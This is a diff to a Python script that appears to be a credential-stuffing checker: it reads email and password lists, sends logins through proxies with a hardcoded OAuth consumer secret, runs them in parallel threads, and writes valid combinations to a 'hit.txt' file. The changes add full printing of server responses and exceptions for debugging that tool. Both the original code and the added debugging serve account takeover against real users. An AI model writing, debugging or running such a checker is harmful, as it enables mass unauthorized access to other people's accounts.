@@ -5,7 +5,9 @@ import time
 import uuid
 import hmac
 import base64
+import builtins
 import hashlib
+import traceback
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
 
@@ -23,6 +25,44 @@ CONSUMER_SECRET = "84dbb79eddc1effe14965db52caeae70636ac31b"
 INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
 
 HITS_FILENAME = "hit.txt"
+
+_RESPONSE_PRINT_LOCK = threading.Lock()
+
+
+def print_reponse_finale_complete(email, etape, url, response):
+    body = response.text if getattr(response, "text", None) is not None else ""
+    st = getattr(response, "status_code", "?")
+    final_u = ""
+    try:
+        final_u = getattr(response, "url", "") or ""
+    except Exception:
+        pass
+    lines_hdr = []
+    try:
+        for k, v in response.headers.items():
+            lines_hdr.append(f"{k}: {v}")
+    except Exception:
+        pass
+    hdr = "\n".join(lines_hdr) if lines_hdr else "(non disponible)"
+    with _RESPONSE_PRINT_LOCK:
+        builtins.print("\n")
+        builtins.print("#" * 78)
+        builtins.print("RÉPONSE FINALE COMPLÈTE")
+        builtins.print("#" * 78)
+        builtins.print(f"Étape      : {etape}")
+        builtins.print(f"Compte     : {email}")
+        builtins.print(f"URL        : {url}")
+        builtins.print(f"HTTP       : {st}")
+        if final_u and str(final_u) != str(url):
+            builtins.print(f"URL finale : {final_u}")
+        builtins.print("-" * 78)
+        builtins.print("EN-TÊTES RÉPONSE :")
+        builtins.print(hdr)
+        builtins.print("-" * 78)
+        builtins.print("CORPS (brut, intégral) :")
+        builtins.print(body if body else "(vide)")
+        builtins.print("#" * 78)
+        builtins.print("", flush=True)
 
 # =========================================================
 # HITS FILE (append en direct, thread-safe)
@@ -229,7 +269,7 @@ LOGIN_URL = (
 _STATUS_OK_RE = re.compile(r'"status"\s*:\s*"ok"')
 
 
-def fetch_request_token(session):
+def fetch_request_token(session, email):
     request_token_body = {
         "realm": REQUEST_TOKEN_URL
     }
@@ -252,6 +292,12 @@ def fetch_request_token(session):
     )
 
     if response.status_code != 200:
+        print_reponse_finale_complete(
+            email,
+            "requestToken — échec (HTTP ≠ 200)",
+            REQUEST_TOKEN_URL,
+            response,
+        )
         return None
 
     parsed = parse_qs(response.text)
@@ -259,6 +305,12 @@ def fetch_request_token(session):
         oauth_token = parsed["oauth_token"][0]
         oauth_token_secret = parsed["oauth_token_secret"][0]
     except (KeyError, IndexError):
+        print_reponse_finale_complete(
+            email,
+            "requestToken — échec (corps sans oauth_token / oauth_token_secret)",
+            REQUEST_TOKEN_URL,
+            response,
+        )
         return None
 
     return oauth_token, oauth_token_secret
@@ -346,7 +398,7 @@ def load_accounts_from_file(path):
 def process_account(email, password, proxy_url, stats, hit_writer):
     session = new_session(proxy_url)
     try:
-        token_pair = fetch_request_token(session)
+        token_pair = fetch_request_token(session, email)
         if token_pair is None:
             stats.record("error")
             return
@@ -355,11 +407,25 @@ def process_account(email, password, proxy_url, stats, hit_writer):
         response = post_login(
             session, oauth_token, oauth_token_secret, email, password
         )
+        print_reponse_finale_complete(
+            email,
+            "login — réponse finale",
+            LOGIN_URL,
+            response,
+        )
         kind = classify_login_response(response)
         if kind == "valid":
             hit_writer.append_hit(email, password)
         stats.record(kind)
-    except Exception:
+    except Exception as e:
+        with _RESPONSE_PRINT_LOCK:
+            builtins.print("\n")
+            builtins.print("!" * 78)
+            builtins.print(f"EXCEPTION — compte: {email}")
+            builtins.print(repr(e))
+            traceback.print_exc()
+            builtins.print("!" * 78)
+            builtins.print("", flush=True)
         stats.record("error")
 
 
